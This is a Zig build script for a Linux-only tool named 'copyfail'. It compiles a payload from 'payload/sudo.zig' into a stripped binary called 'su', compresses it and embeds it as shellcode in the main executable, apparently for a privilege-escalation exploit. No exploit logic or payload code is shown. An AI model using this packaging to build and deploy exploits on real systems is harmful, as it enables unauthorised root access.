const std = @import("std");

pub fn build(b: *std.Build) void {
    const optimize = b.standardOptimizeOption(.{});
    const target = b.standardTargetOptions(.{});
    if (target.result.os.tag != .linux) {
        std.log.err("Only Linux targets are supported", .{});
        return;
    }

    const compress_shellcode = b.option(bool, "compress", "Compress the shell code (Default: true)") orelse true;

    const shellcode = ShellCode.init(compress_shellcode, target, b);
    shellcode.addShellCode(b, b.path("payload/sudo.zig"), "sudo");

    const c = b.addTranslateC(.{
        .optimize = optimize,
        .target = target,
        .root_source_file = b.path("src/cimport.c"),
    });
    const exe = b.addExecutable(.{
        .name = "copyfail",
        .root_module = b.createModule(.{
            .root_source_file = b.path("src/main.zig"),
            .target = target,
            .optimize = optimize,
        }),
    });
    exe.root_module.addImport("c", c.createModule());
    exe.root_module.addImport("shellcode", shellcode.createModule(b));
    b.installArtifact(exe);

    const run_step = b.step("run", "Run the executable");
    const run = b.addRunArtifact(exe);
    if (b.args) |args| run.addArgs(args);
    run_step.dependOn(&run.step);
}

fn buildShellCodeBinary(b: *std.Build, compress: bool, root_source_file: std.Build.LazyPath, target: std.Build.ResolvedTarget) std.Build.LazyPath {
    const bin = b.addExecutable(.{
        .name = "su",
        .root_module = b.createModule(.{
            .root_source_file = root_source_file,
            .target = target,
            .optimize = .ReleaseSmall,
            .strip = true,
            .single_threaded = true,
        }),
    });
    bin.link_eh_frame_hdr = false;
    bin.root_module.omit_frame_pointer = true;

    if (compress) {
        return CompressedFile.create(bin.getEmittedBin(), b).lazyPath();
    } else {
        return bin.getEmittedBin();
    }
}

const CompressedFile = struct {
    step: std.Build.Step,
    path: std.Build.LazyPath,
    file: std.Build.GeneratedFile,

    pub fn create(path: std.Build.LazyPath, b: *std.Build) *CompressedFile {
        const self = b.allocator.create(CompressedFile) catch @panic("OOM");
        self.* = .{
            .step = .init(.{
                .id = .custom,
                .name = "compress file",
                .owner = b,
                .makeFn = make,
            }),
            .path = path,
            .file = .{
                .step = &self.step,
            },
        };
        path.addStepDependencies(&self.step);
        return self;
    }

    fn lazyPath(self: *CompressedFile) std.Build.LazyPath {
        return .{ .generated = .{ .file = &self.file } };
    }

    fn make(step: *std.Build.Step, opts: std.Build.Step.MakeOptions) !void {
        const self: *CompressedFile = @fieldParentPtr("step", step);
        const b = step.owner;
        const graph = b.graph;
        const io = graph.io;
        try step.singleUnchangingWatchInput(self.path);

        const input_path = self.path.getPath2(b, step);
        const input_file = try std.Io.Dir.cwd().openFile(io, input_path, .{});
        defer input_file.close(io);

        var read_buffer: [1024]u8 = undefined;
        var reader = input_file.reader(io, &read_buffer);

        const output_path = try b.cache_root.join(opts.gpa, &.{
            b.fmt("{s}.gz", .{std.fs.path.basename(input_path)}),
        });
        const out_file = try std.Io.Dir.cwd().createFile(io, output_path, .{});
        defer out_file.close(io);
        var write_buffer: [1024]u8 = undefined;
        var writer = out_file.writer(io, &write_buffer);

        var compress_buffer: [std.compress.flate.max_window_len]u8 = undefined;
        var flate = try std.compress.flate.Compress.init(&writer.interface, &compress_buffer, .gzip, .best);

        _ = try flate.writer.sendFileAll(&reader, .unlimited);

        try flate.finish();

        try writer.interface.flush();

        self.file.path = output_path;
    }
};

const ShellCode = struct {
    compress: bool,
    options: *std.Build.Step.Options,
    target: std.Build.ResolvedTarget,
    output: std.Build.LazyPath,

    pub fn init(compress: bool, target: std.Build.ResolvedTarget, b: *std.Build) ShellCode {
        const options = b.addOptions();
        options.addOption(bool, "is_compressed", compress);
        return .{
            .compress = compress,
            .options = options,
            .target = target,
            .output = options.getOutput(),
        };
    }

    pub fn addStepDependencies(self: *const ShellCode, step: *std.Build.Step) void {
        self.output.addStepDependencies(step);
    }

    pub fn addShellCode(self: *const ShellCode, b: *std.Build, path: std.Build.LazyPath, name: []const u8) void {
        const shellcode_path = buildShellCodeBinary(b, self.compress, path, self.target);
        const addStep = AddShellCode.create(shellcode_path, name, self.options, b);
        self.output.generated.file.step.dependOn(&addStep.step);
    }

    pub fn createModule(self: *const ShellCode, b: *std.Build) *std.Build.Module {
        return b.createModule(.{ .root_source_file = self.output });
    }
};

const AddShellCode = struct {
    step: std.Build.Step,
    path: std.Build.LazyPath,
    name: []const u8,
    options: *std.Build.Step.Options,

    pub fn create(path: std.Build.LazyPath, name: []const u8, options: *std.Build.Step.Options, b: *std.Build) *AddShellCode {
        const self = b.allocator.create(AddShellCode) catch @panic("OOM");
        self.* = .{
            .step = .init(.{
                .id = .custom,
                .name = b.fmt("add shell code {s}", .{name}),
                .owner = b,
                .makeFn = make,
            }),
            .path = path,
            .name = name,
            .options = options,
        };
        path.addStepDependencies(&self.step);
        return self;
    }

    fn make(step: *std.Build.Step, opts: std.Build.Step.MakeOptions) !void {
        const self: *AddShellCode = @fieldParentPtr("step", step);
        const b = step.owner;
        const graph = b.graph;
        const io = graph.io;
        try step.singleUnchangingWatchInput(self.path);

        const path = self.path.getPath2(b, step);
        const data = try std.Io.Dir.cwd().readFileAlloc(io, path, opts.gpa, .unlimited);
        defer opts.gpa.free(data);

        self.options.addOption([]const u8, self.name, data);
    }
};
